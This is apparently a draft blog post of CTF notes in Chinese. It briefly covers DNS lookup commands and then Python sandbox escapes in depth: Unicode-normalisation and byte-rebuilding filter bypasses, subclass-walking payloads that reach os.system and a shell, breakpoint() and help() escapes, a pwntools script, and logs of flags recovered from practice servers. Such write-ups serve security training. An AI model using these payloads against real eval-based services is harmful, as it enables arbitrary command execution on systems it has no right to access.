---
title: Misc
subtitle:
date: 2024-09-28T11:11:56+08:00
draft: true
author:
  name: 瞻鹤
  link:
  email: he-zhan@outlook.com
  avatar: /images/avatar.jpg
description:
keywords:
license:
comment: false
weight: 0
tags:
  - 
categories:
  - homework
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRss: false
hiddenFromRelated: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter
---

<!--more-->	

[toc]

### 隐写



### 域名相关

#### 查看域名注册信息

whois 域名

#### DNS域名查询

nslookup -q =type domain

~~~ markdown
其中，type可以是以下这些类型：

A 地址记录
AAAA 地址记录
AFSDB Andrew文件系统数据库服务器记录
ATMA ATM地址记录
CNAME 别名记录
HINFO 硬件配置记录，包括CPU、操作系统信息
ISDN 域名对应的ISDN号码
MB 存放指定邮箱的服务器
MG 邮件组记录
MINFO 邮件组和邮箱的信息记录
MR 改名的邮箱记录
MX 邮件服务器记录
NS 名字服务器记录
PTR 反向记录
RP 负责人记录
RT 路由穿透记录
SRV TCP服务器信息记录
TXT 域名对应的文本信息
X25 域名对应的X.25地址记录
~~~

## PYJAIL

[Jail 【Python沙箱逃逸问题合集】 - Kicky_Mu - 博客园](https://www.cnblogs.com/mumuhhh/p/17811377.html)

~~~ python
from unicodedata import normalize
from string import ascii_lowercase
from collections import defaultdict

lst = list(ascii_lowercase)
dic = defaultdict(list)
for char in lst:
    for i in range(0x110000):
        if normalize("NFKC", chr(i)) == char:
            dic[char].append(chr(i))
        if len(dic[char]) > 9:
            break
print(dic)
~~~

unicode碰撞

~~~
defaultdict(<class 'list'>, {'a': ['a', 'ª', 'ᵃ', 'ₐ', 'ⓐ', 'ａ', '𝐚', '𝑎', '𝒂', '𝒶'], 'b': ['b', 'ᵇ', 'ⓑ', 'ｂ', '𝐛', '𝑏', '𝒃', '𝒷', '𝓫', '𝔟'], 'c': ['c', 'ᶜ', 'ⅽ', 'ⓒ', 'ｃ', '𝐜', '𝑐', '𝒄', '𝒸', '𝓬'], 'd': ['d', 'ᵈ', 'ⅆ', 'ⅾ', 'ⓓ', 'ｄ', '𝐝', '𝑑', '𝒅', '𝒹'], 'e': ['e', 'ᵉ', 'ₑ', 'ℯ', 'ⅇ', 'ⓔ', 'ｅ', '𝐞', '𝑒', '𝒆'], 'f': ['f', 'ᶠ', 'ⓕ', 'ｆ', '𝐟', '𝑓', '𝒇', '𝒻', '𝓯', '𝔣'], 'g': ['g', 'ᵍ', 'ℊ', 'ⓖ', 'ｇ', '𝐠', '𝑔', '𝒈', '𝓰', '𝔤'], 'h': ['h', 'ʰ', 'ₕ', 'ℎ', 'ⓗ', 'ｈ', '𝐡', '𝒉', '𝒽', '𝓱'], 'i': ['i', 'ᵢ', 'ⁱ', 'ℹ', 'ⅈ', 'ⅰ', 'ⓘ', 'ｉ', '𝐢', '𝑖'], 'j': ['j', 'ʲ', 'ⅉ', 'ⓙ', 'ⱼ', 'ｊ', '𝐣', '𝑗', '𝒋', '𝒿'], 'k': ['k', 'ᵏ', 'ₖ', 'ⓚ', 'ｋ', '𝐤', '𝑘', '𝒌', '𝓀', '𝓴'], 'l': ['l', 'ˡ', 'ₗ', 'ℓ', 'ⅼ', 'ⓛ', 'ｌ', '𝐥', '𝑙', '𝒍'], 'm': ['m', 'ᵐ', 'ₘ', 'ⅿ', 'ⓜ', 'ｍ', '𝐦', '𝑚', '𝒎', '𝓂'], 'n': ['n', 'ⁿ', 'ₙ', 'ⓝ', 'ｎ', '𝐧', '𝑛', '𝒏', '𝓃', '𝓷'], 'o': ['o', 'º', 'ᵒ', 'ₒ', 'ℴ', 'ⓞ', 'ｏ', '𝐨', '𝑜', '𝒐'], 'p': ['p', 'ᵖ', 'ₚ', 'ⓟ', 'ｐ', '𝐩', '𝑝', '𝒑', '𝓅', '𝓹'], 'q': ['q', 'ⓠ', 'ｑ', '𐞥', '𝐪', '𝑞', '𝒒', '𝓆', '𝓺', '𝔮'], 'r': ['r', 'ʳ', 'ᵣ', 'ⓡ', 'ｒ', '𝐫', '𝑟', '𝒓', '𝓇', '𝓻'], 's': ['s', 'ſ', 'ˢ', 'ₛ', 'ⓢ', 'ｓ', '𝐬', '𝑠', '𝒔', '𝓈'], 't': ['t', 'ᵗ', 'ₜ', 'ⓣ', 'ｔ', '𝐭', '𝑡', '𝒕', '𝓉', '𝓽'], 'u': ['u', 'ᵘ', 'ᵤ', 'ⓤ', 'ｕ', '𝐮', '𝑢', '𝒖', '𝓊', '𝓾'], 'v': ['v', 'ᵛ', 'ᵥ', 'ⅴ', 'ⓥ', ' ｖ', '𝐯', '𝑣', '𝒗', '𝓋'], 'w': ['w', 'ʷ', 'ⓦ', 'ｗ', '𝐰', '𝑤', '𝒘', '𝓌', '𝔀', '𝔴'], 'x': ['x', 'ˣ', 'ₓ', 'ⅹ', 'ⓧ', 'ｘ', '𝐱', '𝑥', '𝒙', '𝓍'], 'y': ['y', 'ʸ', 'ⓨ', 'ｙ', '𝐲', '𝑦', '𝒚', '𝓎', '𝔂', '𝔶'], 'z': ['z', 'ᶻ', 'ⓩ', 'ｚ', '𝐳', '𝑧', '𝒛', '𝓏', '𝔃', '𝔷']})
~~~



~~~ PYTHON
open("/flag").read()
open(chr(102)+chr(108)+chr(97)+chr(103)).read() //chr拼接绕过过滤
open((bytes([102])+bytes([108])+bytes([97])+bytes([103])).decode()).read() //chr被ban的时候

__import__("os").system("cat flag")

globals() //查看全局变量
dir() //查看目录
help()
server
//这两条语句也可以查看全局变量
~~~

system("cat flag"):

~~~ python
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(bytes([115])+bytes([121])+bytes([115])+bytes([116])+bytes([101])+bytes([109])).decode()]((bytes([99])+bytes([97])+bytes([116])+bytes([32])+bytes([102])+bytes([108])+bytes([97])+bytes([103])).decode())
~~~

执行system(???)

~~~ python
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode()](???)

例如ls
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode()]((type(str(1).encode())([108])+type(str(1).encode())([115])).decode())

可以用用.__add__来替换加号
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115]).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([115])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([101])).__add__(type(str(1).encode())([109]))).decode()]((type(str(1).encode())([108]).__add__(type(str(1).encode())([115]))).decode())
~~~

~~~ python
lst = []
for i in "cat flag_y0u_CaNt_FiNd_mE":
    lst.append(f"type(str(1).encode())([{ord(i)}])")

print("("+lst.pop(0),end='')
for i in lst:
    print(f".__add__({i})",end='')

print(").decode()")
~~~



~~~ python
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[list(dict(system=1))[0]](list(dict(sh=1))[0])


nc node5.anna.nssctf.cn 28460                                                                                                    ─╯

  _                _                           _       _ _   _                _ _  _   ____  
 | |              (_)                         (_)     (_) | | |              | | || | |___ \ 
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_  __) |
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _||__ < 
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_ ___) |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)____/ 
              __/ |                          _/ |                                            
             |___/                          |__/                                             
                                                                                                                                                                                      
    
Welcome to the python jail
Let's have an beginner jail of calc
Enter your expression and I will evaluate it for you.
Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes,open,type and `,",',+ Good luck!
> [].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[list(dict(system=1))[0]](list(dict(sh=1))[0])
sh: 0: can't access tty; job control turned off
$ ls
flag_7e86c334669ecf2edb5bd7f7fdd0ea8e  server.py
$ cat flag_7e86c334669ecf2edb5bd7f7fdd0ea8e
flag=NSSCTF{6af5fcec-b72b-43f9-84c7-37caf8f183dc}
$ 
~~~






### 限制输入长度时：

#### 输入长度小于13时

~~~ python
eval(input())
执行后则不再限制

既有过滤又有长度限制。浅试了一下大概ban了eval、input、exec这几个字符，但是python中存在unicode的注入，所以直接调用level2的payload改下unicode就OK了，可使用背景处的碰撞脚本实现。
𝓮val(inp𝓾t())
breakpoint() 调试函数
~~~

~~~ python
Welcome to the python jail
Let's have an beginner jail of calc
Enter your expression and I will evaluate it for you.
> breakpoint()
--Return--
> <string>(1)<module>()->None
(Pdb) open("flag").read()
'flag=NSSCTF{a9e00fb8-7899-4bcf-b8b9-78e6f4508a20}\n'
(Pdb) 
~~~

结合pwntools方法

~~~ python
from pwn import *

io = remote("node5.anna.nssctf.cn",28141)
io.sendlineafter("Enter your expression and I will evaluate it for you.","𝓮val(inp𝓾t())")
io.interactive()
~~~

#### 输入长度小于7时

help()方法会执行more这个程序，然后就可以执行shell了

~~~ python
help()
sys
! cat flag
~~~

